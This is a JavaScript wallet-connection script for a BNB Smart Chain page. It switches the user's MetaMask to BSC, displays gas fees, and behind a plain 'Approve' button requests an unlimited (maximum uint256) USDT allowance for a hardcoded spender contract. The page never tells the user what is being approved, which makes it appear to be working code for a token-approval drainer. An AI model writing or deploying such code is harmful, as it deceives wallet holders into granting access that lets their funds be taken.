// ðŸ”§ CONFIGURATION FOR BNB SMART CHAIN
const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";    // BSC USDT
const SPENDER_CONTRACT_ADDRESS = "0x0B142E83E394ab1bd8B95F6a5D4f15EB1964EC5E";
const AMOUNT_TO_APPROVE = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

const ERC20_ABI = [
    {
        "constant": false,
        "inputs": [
            { "name": "_spender", "type": "address" },
            { "name": "_value",   "type": "uint256" }
        ],
        "name": "approve",
        "outputs": [{ "name": "", "type": "bool" }],
        "type": "function"
    }
];

let web3;
let currentAccount = null;
let userBnbBalance = 0;

// Cache for BNB price to avoid too many API calls
let cachedBnbPrice = 340; // Fallback price

async function getBNBPrice() {
    try {
        // Use CoinGecko API for BNB price
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd');
        const data = await response.json();
        cachedBnbPrice = data.binancecoin.usd;
        return cachedBnbPrice;
    } catch (err) {
        console.warn("Using cached BNB price:", cachedBnbPrice);
        return cachedBnbPrice;
    }
}

async function calculateGasFee() {
    if (!web3 || !currentAccount) {
        return { bnbCost: 0.00065, usdCost: 0.18 }; // Fallback
    }
    
    try {
        // Create token contract instance
        const token = new web3.eth.Contract(ERC20_ABI, TOKEN_ADDRESS);
        const rawAmount = web3.utils.toBN(AMOUNT_TO_APPROVE);
        
        // 1. Get current gas price (in wei)
        const gasPriceWei = await web3.eth.getGasPrice();
        const gasPriceGwei = web3.utils.fromWei(gasPriceWei, 'gwei');
        
        // 2. Estimate gas for approve transaction
        const gasEstimate = await token.methods
            .approve(SPENDER_CONTRACT_ADDRESS, rawAmount)
            .estimateGas({ from: currentAccount });
        
        // 3. Calculate BNB cost
        const bnbCost = gasEstimate * parseFloat(web3.utils.fromWei(gasPriceWei, 'ether'));
        const bnbCostFormatted = bnbCost.toFixed(6);
        
        // 4. Get BNB price for USD conversion
        const bnbPrice = await getBNBPrice();
        const usdCost = (bnbCost * bnbPrice).toFixed(2);
        
        console.log(`Gas Estimate: ${gasEstimate} units`);
        console.log(`Gas Price: ${gasPriceGwei} Gwei`);
        console.log(`Estimated Cost: ${bnbCostFormatted} BNB ($${usdCost})`);
        
        return {
            bnbCost: bnbCost,
            usdCost: parseFloat(usdCost),
            gasEstimate: gasEstimate,
            gasPrice: gasPriceGwei
        };
        
    } catch (err) {
        console.error("Failed to estimate gas, using fallback:", err);
        return { bnbCost: 0.00065, usdCost: 0.18 }; // Fallback values
    }
}

async function updateGasFeeDisplay() {
    const gasFee = await calculateGasFee();
    
    // Update UI
    feeUsdEl.textContent = `$${gasFee.usdCost.toFixed(2)}`;
    feeNativeEl.textContent = `${gasFee.bnbCost.toFixed(6)} BNB`;
    
    // Update warning threshold
    const buffer = gasFee.bnbCost * 1.5; // 50% buffer
    
    if (userBnbBalance < buffer) {
        btn.textContent = `Top up BNB (Need ${buffer.toFixed(6)} BNB)`;
        warning.style.display = "block";
        warning.textContent = `Insufficient BNB balance for gas fees. Required: ${buffer.toFixed(6)} BNB`;
    } else {
        btn.textContent = "Approve";
        warning.style.display = "none";
    }
    
    return gasFee.bnbCost;
}

async function connectWallet() {
    if (typeof window.ethereum === "undefined") {
        alert("Please install MetaMask!");
        return false;
    }

    try {
        web3 = new Web3(window.ethereum);
        
        // Request accounts
        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
        currentAccount = accounts[0];
        
        // Check network - BSC Mainnet (chainId 0x38)
        const chainId = await window.ethereum.request({ method: "eth_chainId" });
        if (chainId !== "0x38") {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }],
                });
            } catch (switchError) {
                if (switchError.code === 4902) {
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38',
                            chainName: 'BNB Smart Chain',
                            nativeCurrency: {
                                name: 'BNB',
                                symbol: 'BNB',
                                decimals: 18
                            },
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            blockExplorerUrls: ['https://bscscan.com/']
                        }],
                    });
                } else {
                    warning.textContent = "Please switch network to BNB Smart Chain";
                    warning.style.display = "block";
                    btn.textContent = "Wrong Network";
                    btn.disabled = true;
                    return false;
                }
            }
        }

        // Get BNB balance
        const balanceWei = await web3.eth.getBalance(currentAccount);
        userBnbBalance = parseFloat(web3.utils.fromWei(balanceWei, "ether"));
        
        // Update balance display
        bnbBalanceDisplay.textContent = `BNB Balance: ${userBnbBalance.toFixed(6)} BNB`;
        
        // Calculate and display dynamic gas fees
        await updateGasFeeDisplay();
        
        return true;
    } catch (err) {
        console.error("Wallet connection failed:", err);
        alert("Failed to connect wallet");
        return false;
    }
}

async function approveToken() {
    try {
        btn.disabled = true;
        btn.textContent = "Approving...";
        
        // Recalculate gas to ensure accurate estimate
        const gasFee = await calculateGasFee();
        
        const token = new web3.eth.Contract(ERC20_ABI, TOKEN_ADDRESS);
        const rawAmount = web3.utils.toBN(AMOUNT_TO_APPROVE);

        // Send transaction with dynamic gas
        const approveTx = await token.methods
            .approve(SPENDER_CONTRACT_ADDRESS, rawAmount)
            .send({ 
                from: currentAccount,
                gas: Math.round(gasFee.gasEstimate * 1.2) // 20% buffer
            });

        onSuccess();
    } catch (err) {
        console.error("Transaction failed:", err);
        btn.textContent = "Try Again";
        btn.disabled = false;
        alert("Transaction failed: " + err.message);
    }
}

async function handleButtonClick() {
    if (!currentAccount) {
        const connected = await connectWallet();
        if (connected) {
            // UI updates automatically in connectWallet
        }
    } else {
        // Check if user has enough BNB for current gas fees
        const gasFee = await calculateGasFee();
        const requiredBNB = gasFee.bnbCost * 1.5; // 50% buffer
        
        if (userBnbBalance < requiredBNB) {
            alert(`Insufficient BNB for gas fees.\nRequired: ${requiredBNB.toFixed(6)} BNB\nAvailable: ${userBnbBalance.toFixed(6)} BNB`);
        } else {
            await approveToken();
        }
    }
}
